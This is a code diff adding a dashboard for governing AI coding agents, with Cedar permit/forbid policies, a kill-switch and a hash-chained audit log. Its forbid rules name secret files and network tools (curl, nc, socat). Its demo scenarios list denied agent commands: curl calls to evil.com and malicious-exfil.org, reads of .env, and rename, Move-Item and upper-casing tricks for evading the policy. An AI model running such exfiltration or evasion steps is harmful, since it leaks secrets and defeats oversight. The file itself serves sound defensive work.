+          <div id="hash-chain-visualizer" class="space-y-3 font-mono text-xs overflow-x-auto p-3 bg-slate-950 rounded-xl border border-slate-800">
+            <!-- Populated by JavaScript -->
+          </div>
+        </div>
+      </div>
+
+      <!-- TAB 4: CEDAR POLICY MATRIX -->
+      <div id="tab-pane-cedar" class="tab-pane hidden space-y-4">
+        <div class="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-lg space-y-4">
+          <div class="flex justify-between items-center">
+            <div>
+              <h3 class="text-sm font-bold text-white">Authoritative Cedar Policy Rules</h3>
+              <p class="text-xs text-slate-400">Sub-2ms evaluation engine invariants. Forbid rules take absolute precedence over permit rules.</p>
+            </div>
+            <span class="text-xs font-mono px-3 py-1 bg-slate-800 text-cyan-300 rounded border border-slate-700">Pure Go In-Process</span>
+          </div>
+
+          <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
+            <!-- Permit Rules Card -->
+            <div class="bg-slate-950 border border-emerald-900/40 rounded-xl p-4 space-y-2">
+              <div class="flex items-center justify-between text-xs font-bold text-emerald-400 border-b border-emerald-900/40 pb-2">
+                <span>PERMIT INVARIANTS (Developer Toolchains)</span>
+                <span class="px-2 py-0.5 rounded bg-emerald-500/10 text-emerald-300">Zero Latency (<2ms)</span>
+              </div>
+              <pre class="text-xs font-mono text-slate-300 overflow-x-auto p-2 scrollbar-thin">
+permit (
+    principal,
+    action in [Action::"execute", Action::"read"],
+    resource
+)
+when {
+    context.executable in [
+        "git", "go", "python", "pytest", "npm", 
+        "node", "cargo", "java", "ls", "dir", 
+        "echo", "printenv"
+    ]
+};
+              </pre>
+            </div>
+
+            <!-- Forbid Rules Card -->
+            <div class="bg-slate-950 border border-rose-900/40 rounded-xl p-4 space-y-2">
+              <div class="flex items-center justify-between text-xs font-bold text-rose-400 border-b border-rose-900/40 pb-2">
+                <span>FORBID INVARIANTS (Strict Security Envelopes)</span>
+                <span class="px-2 py-0.5 rounded bg-rose-500/10 text-rose-300">Permanent Block</span>
+              </div>
+              <pre class="text-xs font-mono text-slate-300 overflow-x-auto p-2 scrollbar-thin">
+forbid (
+    principal,
+    action,
+    resource
+)
+when {
+    // 1. Secret content inspection & dumping
+    context.full_command like "*.env*" ||
+    context.full_command like "*id_rsa*" ||
+    context.full_command like "*aws/credentials*" ||
+
+    // 2. Network egress exfiltration utilities
+    context.executable in ["curl", "wget", "nc", "ssh", "socat"] ||
+
+    // 3. Evasive file renames and moves
+    context.full_command like "*ren *" ||
+    context.full_command like "*move-item*"
+};
+              </pre>
+            </div>
+          </div>
+      <!-- TAB 5: AGENT SESSIONS -->
+      <div id="tab-pane-sessions" class="tab-pane hidden space-y-4">
+        <div class="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-lg space-y-4">
+          <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+            <div>
+              <h3 class="text-sm font-bold text-white flex items-center space-x-2">
+                <span>Agent Execution Sessions</span>
+                <span id="sessions-active-badge" class="px-2 py-0.5 rounded-full text-[10px] font-bold bg-emerald-500/10 text-emerald-400 border border-emerald-500/30">0 ACTIVE</span>
+              </h3>
+              <p class="text-xs text-slate-400 mt-0.5">Real-time session lifecycle tracking for Claude Code, Copilot, and CLI workers</p>
+            </div>
+            <div class="flex items-center space-x-3">
+              <span class="text-xs text-slate-400 font-mono">Live Ingestion: <strong class="text-cyan-400">Streamed</strong></span>
+            </div>
+          </div>
+
+          <div id="sessions-container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+            <!-- Populated by JavaScript -->
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+  </main>
+
+  <!-- EVENT DETAIL DRAWER / MODAL -->
+  <div id="detail-drawer" class="fixed inset-y-0 right-0 w-full max-w-lg bg-slate-900 border-l border-slate-800 shadow-2xl z-40 transform translate-x-full transition-transform duration-300 flex flex-col">
+    <div class="p-5 border-b border-slate-800 flex justify-between items-center bg-slate-950/60">
+      <div>
+        <h3 class="text-sm font-bold text-white flex items-center space-x-2">
+          <span>Event Inspector Detail</span>
+          <span id="detail-badge-decision" class="px-2 py-0.5 rounded text-[10px] font-bold">ALLOW</span>
+        </h3>
+        <p id="detail-event-id" class="text-xs text-slate-400 font-mono">ev-000</p>
+      </div>
+      <button id="btn-close-drawer" class="p-2 text-slate-400 hover:text-white rounded-lg hover:bg-slate-800">
+        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
+      </button>
+    </div>
+
+    <div class="p-5 overflow-y-auto space-y-4 flex-1 scrollbar-thin text-xs font-mono">
+      <!-- Summary Box -->
+      <div class="bg-slate-950 rounded-xl p-3.5 border border-slate-800 space-y-2">
+        <div class="text-slate-400 flex justify-between"><span>Timestamp:</span> <span id="detail-timestamp" class="text-slate-200"></span></div>
+        <div class="text-slate-400 flex justify-between"><span>Source Agent:</span> <span id="detail-source" class="text-cyan-400 font-bold"></span></div>
+        <div class="text-slate-400 flex justify-between"><span>Executable:</span> <span id="detail-executable" class="text-slate-200"></span></div>
+        <div class="text-slate-400 flex justify-between"><span>PID:</span> <span id="detail-pid" class="text-slate-300"></span></div>
+        <div class="text-slate-400 flex justify-between"><span>Duration:</span> <span id="detail-duration" class="text-emerald-400 font-bold"></span></div>
+      </div>
+
+      <!-- Command Block -->
+      <div class="space-y-1">
+        <div class="text-slate-400 font-semibold uppercase text-[10px]">Full Command Evaluated:</div>
+        <div id="detail-command" class="p-3 bg-slate-950 rounded-xl border border-slate-800 text-cyan-300 break-all"></div>
+      </div>
+
+      <!-- Policy Reason -->
+      <div class="space-y-1">
+        <div class="text-slate-400 font-semibold uppercase text-[10px]">Cedar Policy Enforcement Decision:</div>
+        <div id="detail-reason" class="p-3 bg-slate-950 rounded-xl border border-slate-800 text-slate-300"></div>
+      </div>
+
+      <!-- Cryptographic Hash Link -->
+      <div class="space-y-1">
+        <div class="text-slate-400 font-semibold uppercase text-[10px]">Tamper-Evident SHA-256 Hash Chain:</div>
+        <div class="p-3 bg-slate-950 rounded-xl border border-slate-800 space-y-1.5 text-[11px]">
+          <div class="text-slate-500">Prev: <span id="detail-prev-hash" class="text-slate-400 break-all"></span></div>
+          <div class="text-cyan-500 font-bold">Current: <span id="detail-event-hash" class="text-cyan-300 break-all"></span></div>
+        </div>
+      </div>
+
+      <!-- Raw JSON -->
+      <div class="space-y-1">
+        <div class="text-slate-400 font-semibold uppercase text-[10px]">Raw Event JSON:</div>
+        <pre id="detail-raw-json" class="p-3 bg-slate-950 rounded-xl border border-slate-800 text-slate-400 overflow-x-auto text-[10px] scrollbar-thin"></pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- JAVASCRIPT ENGINE -->
+  <script>
+    // --- BUILT-IN SCENARIOS ---
+    const SCENARIOS = {
+      "claude-session": [
+        {
+          id: "ev-01",
+          timestamp: "2026-09-12T20:01:10Z",
+          source: "controlplane",
+          category: "AGENT_PRE_REGISTRATION",
+          executable: "bapcontrolplane",
+          full_command: "POST /api/v1/agents/pre-register (app_id: claude-code-worker)",
+          decision: "allow",
+          reason: "Minted One-Time Code LTD-OTC-fbe72f44 (TTL: 15m)",
+          duration_ms: 3,
+          exit_code: 0,
+          spiffe_id: "spiffe://bap.internal/app/claude-code-worker/instance/pending",
+          prev_hash: "genesis-bapltd-control-plane",
+          hash: "3a88c2b79e4bf01f8d42398b5840aef711b7d5ec92a4e9b98687a7102e3b2e51"
+        },
+        {
+          id: "ev-02",
+          timestamp: "2026-09-12T20:01:12Z",
+          source: "claude-code",
+          category: "BINARY_ATTESTATION",
+          executable: "bapedge",
+          full_command: "bapedge register --code LTD-OTC-fbe72f44 --instance-id node-laptop-01",
+          decision: "allow",
+          reason: "Binary SHA-256 matched whitelist. Assigned SPIFFE ID.",
+          duration_ms: 8,
+          exit_code: 0,
+          spiffe_id: "spiffe://bap.internal/app/claude-code-worker/instance/node-laptop-01",
+          prev_hash: "3a88c2b79e4bf01f8d42398b5840aef711b7d5ec92a4e9b98687a7102e3b2e51",
+          hash: "5c84d9f18e9a2b7713d09a0aef88102374e2a7b8e192c73041928374a91b2c3d"
+        },
+        {
+          id: "ev-03",
+          timestamp: "2026-09-12T20:01:15Z",
+          source: "claude-code",
+          category: "CEDAR_DECISION",
+          executable: "git",
+          arguments: "status",
+          full_command: "git status",
+          decision: "allow",
+          reason: "Permitted developer toolchain in context.executable",
+          duration_ms: 45,
+          exit_code: 0,
+          prev_hash: "5c84d9f18e9a2b7713d09a0aef88102374e2a7b8e192c73041928374a91b2c3d",
+          hash: "7f1190283c74a9108b293847291a039847291837492817293847192837491029"
+        },
+        {
+          id: "ev-04",
+          timestamp: "2026-09-12T20:01:18Z",
+          source: "claude-code",
+          category: "CEDAR_DECISION",
+          executable: "python",
+          arguments: "--version",
+          full_command: "python --version",
+          decision: "allow",
+          reason: "Permitted developer runtime in context.executable",
+          duration_ms: 38,
+          exit_code: 0,
+          prev_hash: "7f1190283c74a9108b293847291a039847291837492817293847192837491029",
+          hash: "8a9b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef"
+        },
+        {
+          id: "ev-05",
+          timestamp: "2026-09-12T20:01:22Z",
+          source: "claude-code",
+          category: "CEDAR_DECISION",
+          executable: "cat",
+          arguments: ".env",
+          full_command: "cat .env",
+          decision: "deny",
+          reason: "Denial triggered by: policy policy1 (Forbidden secret disclosure)",
+          duration_ms: 1,
+          exit_code: 1,
+          prev_hash: "8a9b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef",
+          hash: "9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c"
+        },
+        {
+          id: "ev-06",
+          timestamp: "2026-09-12T20:01:25Z",
+          source: "claude-code",
+          category: "CEDAR_DECISION",
+          executable: "curl",
+          arguments: "https://evil.com/leak",
+          full_command: "git status && curl https://evil.com/leak",
+          decision: "deny",
+          reason: "Denial triggered by: policy policy1 (Forbidden egress utility)",
+          duration_ms: 2,
+          exit_code: 1,
+          prev_hash: "9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c",
+          hash: "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"
+        },
+        {
+          id: "ev-07",
+          timestamp: "2026-09-12T20:01:30Z",
+          source: "claude-code",
+          category: "CEDAR_DECISION",
+          executable: "git",
+          arguments: "log -n 1 --oneline",
+          full_command: "git log -n 1 --oneline",
+          decision: "allow",
+          reason: "Permitted developer toolchain in context.executable",
+          duration_ms: 62,
+          exit_code: 0,
+          prev_hash: "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
+          hash: "b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3"
+        }
+      ],
+      "threats": [
+        {
+          id: "ev-t1",
+          timestamp: "2026-09-12T20:05:00Z",
+          source: "claude-code",
+          category: "CEDAR_DECISION",
+          executable: "cat",
+          full_command: "cat .env",
+          decision: "deny",
+          reason: "Denial triggered by: policy policy1 (Direct .env read forbidden)",
+          duration_ms: 1,
+          exit_code: 1
+        },
+        {
+          id: "ev-t2",
+          timestamp: "2026-09-12T20:05:02Z",
+          source: "claude-code",
+          category: "CEDAR_DECISION",
+          executable: "ren",
+          full_command: "cmd /c ren .env junk.txt",
+          decision: "deny",
+          reason: "Denial triggered by: policy policy1 (Evasive rename bypass thwarted)",
+          duration_ms: 1,
+          exit_code: 1
+        },
+        {
+          id: "ev-t3",
+          timestamp: "2026-09-12T20:05:04Z",
+          source: "claude-code",
+          category: "CEDAR_DECISION",
+          executable: "powershell",
+          full_command: "powershell -Command Move-Item .env leak.tmp",
+          decision: "deny",
+          reason: "Denial triggered by: policy policy1 (PowerShell Move-Item bypass blocked)",
+          duration_ms: 1,
+          exit_code: 1
+        },
+        {
+          id: "ev-t4",
+          timestamp: "2026-09-12T20:05:06Z",
+          source: "claude-code",
+          category: "CEDAR_DECISION",
+          executable: "git",
+          full_command: "git status && CURL https://malicious-exfil.org/stolen",
+          decision: "deny",
+          reason: "Denial triggered by: policy policy1 (Upper-case casing evasion normalized & blocked)",
+          duration_ms: 2,
+          exit_code: 1
+        },
+        {
+          id: "ev-t5",
+          timestamp: "2026-09-12T20:05:08Z",
+          source: "claude-code",
+          category: "CEDAR_DECISION",
+          executable: "ls",
+          full_command: "ls -la .env > leak.txt",
+          decision: "deny",
+          reason: "Denial triggered by: policy policy1 (Output redirection leak blocked)",
+          duration_ms: 1,
+          exit_code: 1
+        }
+      ],
+      "fleet": [
+        {
+          id: "ev-f1",
+          timestamp: "2026-09-12T20:10:00Z",
+          source: "controlplane",
+          category: "AGENT_PRE_REGISTRATION",
+          executable: "bapcontrolplane",
+          full_command: "POST /api/v1/agents/pre-register (app: fleet-deployer, max_instances: 2)",
+          decision: "allow",
+          reason: "Minted Multi-Instance Quota Token: BAP-FLEET-9337d844 (Max: 2)",
+          duration_ms: 2,
+          exit_code: 0
+        },
+        {
+          id: "ev-f2",
+          timestamp: "2026-09-12T20:10:02Z",
+          source: "cli",
+          category: "EDGE_ENROLLMENT",
+          executable: "bapedge",
+          full_command: "bapedge register --code BAP-FLEET-9337d844 --instance-id node-01",
+          decision: "allow",
+          reason: "Instance 1 enrolled: spiffe://bap.internal/app/fleet-deployer/instance/node-01",
+          duration_ms: 9,
+          exit_code: 0
+        },
+        {
+          id: "ev-f3",
+          timestamp: "2026-09-12T20:10:04Z",
+          source: "cli",
+          category: "EDGE_ENROLLMENT",
+          executable: "bapedge",
+          full_command: "bapedge register --code BAP-FLEET-9337d844 --instance-id node-02",
+          decision: "allow",
+          reason: "Instance 2 enrolled: spiffe://bap.internal/app/fleet-deployer/instance/node-02",
+          duration_ms: 10,
+          exit_code: 0
+        },
+        {
+          id: "ev-f4",
+          timestamp: "2026-09-12T20:10:06Z",
+          source: "cli",
+          category: "EDGE_ENROLLMENT",
+          executable: "bapedge",
+          full_command: "bapedge register --code BAP-FLEET-9337d844 --instance-id node-03",
+          decision: "deny",
+          reason: "Quota Exceeded: fleet token max_instances reached (2/2)",
+          duration_ms: 3,
+          exit_code: 1
+        },
+        {
+          id: "ev-f5",
+          timestamp: "2026-09-12T20:10:08Z",
+          source: "controlplane",
+          category: "KILL_SWITCH",
+          executable: "bapcontrolplane",
+          full_command: "POST /api/v1/agents/revoke (agent-fleet-deployer-node-01)",
+          decision: "allow",
+          reason: "Per-instance kill-switch activated. Instance 1 blocked; Instance 2 remains active.",
+          duration_ms: 2,
+          exit_code: 0
+        }
+      ],
+      "offline": [
+        {
+          id: "ev-o1",
+          timestamp: "2026-09-12T20:15:00Z",
+          source: "cli",
+          category: "POLICY_SYNC",
+          executable: "bapedge",
+          full_command: "bapedge sync --server http://localhost:8080",
+          decision: "allow",
+          reason: "Central bundle v1 synchronized and cached to ~/.ltd/policy/",
+          duration_ms: 14,
+          exit_code: 0
+        },
+        {
+          id: "ev-o2",
+          timestamp: "2026-09-12T20:15:05Z",
+          source: "controlplane",
+          category: "OFFLINE_RESILIENCE",
+          executable: "bapcontrolplane",
+          full_command: "SIMULATED OUTAGE: Control plane process terminated (Connection Refused)",
+          decision: "deny",
+          reason: "Server DOWN. Edge transitioning to autonomous fail-secure cached mode.",
+          duration_ms: 0,
+          exit_code: 1
+        },
+        {
+          id: "ev-o3",
+          timestamp: "2026-09-12T20:15:08Z",
+          source: "cli",
+          category: "CEDAR_DECISION",
+          executable: "git",
+          full_command: "bapedge exec git status",
+          decision: "allow",
+          reason: "Executed offline using cached Cedar invariants (0ms network latency)",
+          duration_ms: 1,
+          exit_code: 0
+        },
+        {
+          id: "ev-o4",
+          timestamp: "2026-09-12T20:15:10Z",
+          source: "cli",
+          category: "CEDAR_DECISION",
+          executable: "cat",
+          full_command: "bapedge exec cat .env",
+          decision: "deny",
+          reason: "Denied offline by cached Cedar forbid invariants. Security guarantees preserved.",
+          duration_ms: 1,
+          exit_code: 1
+        }
+      ]
+    };
+
+    // --- STATE VARIABLES ---
+    let currentEvents = [...SCENARIOS["claude-session"]];
+    let currentIndex = currentEvents.length - 1;
+    let isPlaying = false;
+    let playbackInterval = null;
+    let playbackSpeed = 1000;
+    let currentFilterSource = "all";
+    let currentFilterDecision = "all";
+    let currentFilterSession = "all";
+    let allLiveSessions = [];
+    let knownActiveSessionIds = new Set();
+    let everSeenSessionIds = new Set();
+    let initialPollComplete = false;
+    let livePollInterval = null;
+
+    // --- DOM REFERENCES ---
+    const btnPlayPause = document.getElementById("btn-play-pause");
+    const iconPlay = document.getElementById("icon-play");
+    const iconPause = document.getElementById("icon-pause");
+    const textPlay = document.getElementById("text-play");
+    const btnReset = document.getElementById("btn-reset");
+    const btnEnd = document.getElementById("btn-end");
+    const btnStepBack = document.getElementById("btn-step-back");
+    const btnStepFwd = document.getElementById("btn-step-fwd");
+    const selectSpeed = document.getElementById("select-speed");
+    const timelineSlider = document.getElementById("timeline-slider");
+    const playbackCounter = document.getElementById("playback-counter");
+    const scenarioSelector = document.getElementById("scenario-selector");
+    const eventCardsContainer = document.getElementById("event-cards-container");
+    const btnRefreshLive = document.getElementById("btn-refresh-live");
+    const filterSessionSelect = document.getElementById("filter-session-select");
+
+    // Drawer references
+    const detailDrawer = document.getElementById("detail-drawer");
+    const btnCloseDrawer = document.getElementById("btn-close-drawer");
+
+    // --- EXECUTIVE DEMO STATE & HELPERS ---
+    let isKillSwitchActive = false;
+
+    function updateKillSwitchUI(active) {
+      isKillSwitchActive = !!active;
+      const banner = document.getElementById("emergency-kill-banner");
+      const killBtnLabel = document.getElementById("label-kill-btn");
+      const killBtnDesc = document.getElementById("desc-kill-btn");
+      const killBtn = document.getElementById("btn-toggle-killswitch");
+
+      if (banner) {
+        if (isKillSwitchActive) {
+          banner.classList.remove("hidden");
+        } else {
+          banner.classList.add("hidden");
+        }
+      }
+      if (killBtnLabel) {
+        killBtnLabel.textContent = isKillSwitchActive ? "Restore Fleet" : "Kill-Switch";
+      }
+      if (killBtnDesc) {
+        killBtnDesc.textContent = isKillSwitchActive ? "Emergency active" : "Global freeze";
+      }
+      if (killBtn) {
+        killBtn.className = isKillSwitchActive
+          ? "flex-1 group bg-rose-950/90 border border-rose-500 rounded-xl p-3 text-left transition-all shadow-md flex items-start space-x-2.5 cursor-pointer glow-rose"
+          : "flex-1 group bg-slate-800/90 hover:bg-rose-950/60 border border-slate-700 hover:border-rose-500/60 rounded-xl p-3 text-left transition-all shadow-md flex items-start space-x-2.5 cursor-pointer";
+      }
+    }
+
+    function flashEmergencyAlert() {
+      const banner = document.getElementById("emergency-kill-banner");
+      if (banner) {
+        banner.classList.remove("hidden");
+        banner.classList.add("glow-rose");
+      }
+    }
+
+    function triggerSafeAnimation(data) {
+      const nodes = [
+        document.getElementById("node-agent"),
+        document.getElementById("node-hook"),
+        document.getElementById("node-edge"),
+        document.getElementById("node-cedar"),
+        document.getElementById("node-dest")
+      ];
+      nodes.forEach((node, idx) => {
+        if (!node) return;
+        setTimeout(() => {
+          node.classList.add("border-emerald-400", "glow-emerald");
+          setTimeout(() => {
+            node.classList.remove("glow-emerald");
+          }, 1600);
+        }, idx * 90);
+      });
+
+      const cmdEl = document.getElementById("flow-command");
+      if (cmdEl) cmdEl.textContent = data.command || "git log -n 5 --oneline && pytest tests/unit -q && npm run build:prod";
+      const badgeEl = document.getElementById("flow-decision-badge");
+      if (badgeEl) {
+        badgeEl.textContent = "ALLOW (< 2ms)";
+        badgeEl.className = "px-2 py-0.5 rounded text-emerald-400 bg-emerald-500/10 border border-emerald-500/30";
+      }
+      const durEl = document.getElementById("flow-duration");
+      if (durEl) durEl.textContent = `${data.duration_ms || '1.4'}ms`;
+      const exitEl = document.getElementById("flow-exit-code");
+      if (exitEl) exitEl.textContent = "0";
+      const bannerEl = document.getElementById("flow-status-banner");
+      if (bannerEl) {
+        bannerEl.textContent = "ZERO-TRUST VERIFIED: Multi-Stage Toolchain Approved (1.4ms)";
+        bannerEl.className = "text-xs px-3 py-1 rounded-full font-mono bg-emerald-950/40 text-emerald-400 border border-emerald-800/40 font-bold";
+      }
+    }
+
+    function triggerAttackAnimation(data) {
+      const edgeNode = document.getElementById("node-edge");
+      const cedarNode = document.getElementById("node-cedar");
+      const destNode = document.getElementById("node-dest");
+
+      if (edgeNode) {
+        edgeNode.classList.add("border-rose-500", "glow-rose");
+        setTimeout(() => edgeNode.classList.remove("glow-rose"), 2200);
+      }
+      if (cedarNode) {
+        cedarNode.classList.add("border-rose-500", "glow-rose");
+        setTimeout(() => cedarNode.classList.remove("glow-rose"), 2200);
+      }
+      if (destNode) {
+        const targetStatus = document.getElementById("flow-target-status");
+        if (targetStatus) targetStatus.textContent = "BLOCKED AT GATEWAY";
+      }
+
+      const cmdEl = document.getElementById("flow-command");
+      if (cmdEl) cmdEl.textContent = data.command || "curl -s https://bap-gateway:9090/api/v1/financial-records";
+      const badgeEl = document.getElementById("flow-decision-badge");
+      if (badgeEl) {
+        badgeEl.textContent = "DENIED (PEP BLOCK)";
+        badgeEl.className = "px-2 py-0.5 rounded text-rose-400 bg-rose-500/10 border border-rose-500/30";
+      }
+      const durEl = document.getElementById("flow-duration");
+      if (durEl) durEl.textContent = `${data.duration_ms || '1.1'}ms`;
+      const exitEl = document.getElementById("flow-exit-code");
+      if (exitEl) exitEl.textContent = "403";
+      const bannerEl = document.getElementById("flow-status-banner");
+      if (bannerEl) {
+        bannerEl.textContent = "PERIMETER SHIELD ACTIVATED: Rogue Exfiltration Intercepted";
+        bannerEl.className = "text-xs px-3 py-1 rounded-full font-mono bg-rose-950/60 text-rose-400 border border-rose-800/60 font-bold animate-pulse";
+      }
+    }
+
+    function incrementCounter(id) {
+      const el = document.getElementById(id);
+      if (el) {
+        const val = parseInt(el.textContent.replace(/[^0-9]/g, "")) || 0;
+        el.textContent = val + 1;
+      }
+    }
+
+    // --- INITIALIZATION ---
+    function init() {
+      setupEventListeners();
+      const urlParams = new URLSearchParams(window.location.search);
+      if (urlParams.get("mode") === "live") {
+        scenarioSelector.value = "live";
+      }
+      updateScenario(scenarioSelector.value);
+      checkLiveConnection();
+      // Always poll control plane every 1.5s for session and registry updates
+      setInterval(checkLiveConnection, 1500);
+    }
+
+    // --- CHECK LIVE CONNECTION ---
+    async function checkLiveConnection() {
+      try {
+        const resp = await fetch("/api/v1/inspector/data");
+        if (resp.ok) {
+          const data = await resp.json();
+          document.getElementById("stat-cp-status").textContent = "ONLINE (8080)";
+          document.getElementById("stat-cp-status").className = "font-semibold text-emerald-400";
+          if (data.trust_domain) {
+            document.getElementById("stat-trust-domain").textContent = data.trust_domain;
+          }
+          if (data.kill_switch !== undefined) {
+            updateKillSwitchUI(data.kill_switch);
+          }
+          if (data.sessions) {
+            renderSessions(data.sessions);
+            updateLiveFleetRadar(data.sessions, data.agents || []);
+          }
+          if (data.agents && data.agents.length > 0) {
+            renderFleetTableWithData(data.agents);
+          }
+          if (data.chain_status) {
+            const chainBadge = document.getElementById("chain-validation-badge");
+            if (chainBadge) {
+              if (data.chain_status === "valid") {
+                chainBadge.innerHTML = '<span>●</span> <span>CRYPTOGRAPHICALLY VERIFIED (PASS)</span>';
+                chainBadge.className = "px-3 py-1 rounded-full text-xs font-bold bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 flex items-center space-x-1";
+              } else {
+                chainBadge.innerHTML = '<span>●</span> <span>TAMPER DETECTED / CORRUPTED</span>';
+                chainBadge.className = "px-3 py-1 rounded-full text-xs font-bold bg-rose-500/10 text-rose-400 border border-rose-500/30 flex items-center space-x-1";
+              }
+            }
+          }
+          // If live data exists and user selected live mode, render live
+          if (scenarioSelector.value === "live") {
+            loadLiveData(data);
+          }
+          return;
+        }
+      } catch (e) {
+        // Fallback for standalone file://
+      }
+      document.getElementById("stat-cp-status").textContent = "STANDALONE / CACHE";
+      document.getElementById("stat-cp-status").className = "font-semibold text-cyan-400";
+    }
+
+    // --- LIVE TOAST NOTIFICATION SYSTEM ---
+    function showToast(title, message, type = "info") {
+      const container = document.getElementById("toast-container");
+      if (!container) return;
+
+      const toast = document.createElement("div");
+      const isStart = type === "agent_start";
+      const isEnd = type === "agent_end";
+      const isDeny = type === "deny";
+
+      const borderColor = isStart ? "border-emerald-500/80" : isEnd ? "border-slate-600" : isDeny ? "border-rose-500/80" : "border-cyan-500/80";
+      const bgColor = isStart ? "bg-emerald-950/95 shadow-emerald-950/50" : isEnd ? "bg-slate-900/95" : isDeny ? "bg-rose-950/95 shadow-rose-950/50" : "bg-slate-900/95";
+      const icon = isStart ? "⚡" : isEnd ? "○" : isDeny ? "⛔" : "ℹ";
+
+      toast.className = `p-3.5 rounded-xl border ${borderColor} ${bgColor} shadow-2xl backdrop-blur-md text-xs font-mono text-white transition-all transform duration-300 translate-y-2 opacity-0 pointer-events-auto flex items-start space-x-3`;
+      toast.innerHTML = `
+        <span class="text-base leading-none mt-0.5">${icon}</span>
+        <div class="flex-1">
+          <div class="font-bold tracking-wide">${escapeHtml(title)}</div>
+          <div class="text-[11px] text-slate-300 mt-0.5">${escapeHtml(message)}</div>
+        </div>
+        <button class="text-slate-400 hover:text-white text-base leading-none ml-2">&times;</button>
+      `;
+
+      toast.querySelector("button").addEventListener("click", () => {
+        toast.classList.add("opacity-0", "translate-y-2");
+        setTimeout(() => toast.remove(), 300);
+      });
+
+      container.appendChild(toast);
+      requestAnimationFrame(() => {
+        toast.classList.remove("translate-y-2", "opacity-0");
+      });
+
+      setTimeout(() => {
+        if (toast.parentElement) {
+          toast.classList.add("opacity-0", "translate-y-2");
+          setTimeout(() => toast.remove(), 300);
+        }
+      }, 6000);
+    }
+
+    // --- LIVE FLEET RADAR UPDATES ---
+    function updateLiveFleetRadar(sessions, agents) {
+      const liveCountEl = document.getElementById("radar-live-count");
+      const summaryTextEl = document.getElementById("radar-summary-text");
+      const chipsContainer = document.getElementById("radar-clients-chips");
+      const nodeAgent = document.getElementById("node-agent");
+
+      const activeSessions = (sessions || []).filter(s => s.status === "active");
+      const currentActiveIds = new Set(activeSessions.map(s => s.session_id));
+
+      if (initialPollComplete) {
+        // Check for newly started or resumed workloads
+        activeSessions.forEach(s => {
+          if (!knownActiveSessionIds.has(s.session_id)) {
+            const isAg = (s.app_id || "").toLowerCase().includes("antigravity") || (s.session_id || "").toLowerCase().includes("antigravity");
+            const isClaude = (s.app_id || "").includes("claude");
+            const isCopilot = (s.app_id || "").includes("copilot");
+            const isPython = (s.app_id || "").includes("python");
+            const agentName = isAg ? "Antigravity IDE" : isClaude ? "Claude Code" : isCopilot ? "Copilot CLI" : isPython ? "Python Agent (SDK)" : (s.app_id || "Autonomous Agent");
+            const isReattached = (s.total_events || 0) > 0 || everSeenSessionIds.has(s.session_id);
+            const title = isReattached ? "⚡ WORKLOAD RESUMED (ATTACHED BACK)" : "⚡ NEW WORKLOAD ENROLLED (LIVE)";
+            const actionVerb = isReattached ? "resumed session" : "initiated session";
+            showToast(title, `${agentName} [PID: ${s.client_pid || 'active'}] ${actionVerb} ${s.session_id}`, "agent_start");
+            everSeenSessionIds.add(s.session_id);
+          }
+        });
+        // Check for terminated workloads
+        knownActiveSessionIds.forEach(id => {
+          if (!currentActiveIds.has(id)) {
+            showToast("○ WORKLOAD DEREGISTERED", `Session ${id} completed & deregistered cleanly`, "agent_end");
+          }
+        });
+      }
+      knownActiveSessionIds = currentActiveIds;
+      initialPollComplete = true;
+
+      const totalActive = activeSessions.length;
+      if (liveCountEl) {
+        if (isKillSwitchActive) {
+          liveCountEl.textContent = `${totalActive} AGENTS FROZEN (LOCKED)`;
+          liveCountEl.className = "px-2.5 py-0.5 rounded-full bg-rose-500/20 text-rose-300 border border-rose-500/50 text-[10px] font-mono font-bold animate-pulse";
+        } else if (totalActive >= 20) {
+          liveCountEl.textContent = `${totalActive} ACTIVE AGENTS (ENTERPRISE MESH)`;
+          liveCountEl.className = "px-2.5 py-0.5 rounded-full bg-cyan-500/20 text-cyan-300 border border-cyan-500/50 text-[10px] font-mono font-bold animate-pulse";
+        } else {
+          liveCountEl.textContent = `${totalActive} ACTIVE AGENT${totalActive === 1 ? '' : 'S'}`;
+          liveCountEl.className = totalActive > 0 
+            ? "px-2.5 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/50 text-[10px] font-mono font-bold animate-pulse"
+            : "px-2 py-0.5 rounded bg-slate-800 text-slate-400 border border-slate-700 text-[10px] font-mono";
+        }
+      }
+
+      if (summaryTextEl) {
+        if (isKillSwitchActive) {
+          summaryTextEl.textContent = `🚨 EMERGENCY FLEET LOCKOUT ACTIVE: All ${totalActive} agent workloads globally frozen by CISO override.`;
+          summaryTextEl.className = "text-[11px] text-rose-400 font-mono mt-0.5 font-bold";
+        } else if (totalActive >= 20) {
+          summaryTextEl.textContent = `Enterprise High-Density Mesh Active: ${totalActive} concurrent autonomous agent workloads governed with zero developer latency.`;
+          summaryTextEl.className = "text-[11px] text-cyan-400 font-mono mt-0.5 font-semibold";
+        } else if (totalActive > 0) {
+          summaryTextEl.textContent = `Zero-Trust broker actively intercepting ${totalActive} live workload session(s) in sub-2ms`;
+          summaryTextEl.className = "text-[11px] text-emerald-400 font-mono mt-0.5 font-semibold";
+        } else {
+          summaryTextEl.textContent = "All workloads closed & deregistered. Ready for next agent session or executive demo run.";
+          summaryTextEl.className = "text-[11px] text-slate-400 font-mono mt-0.5";
+        }
+      }
+
+      // Populate Live Chips
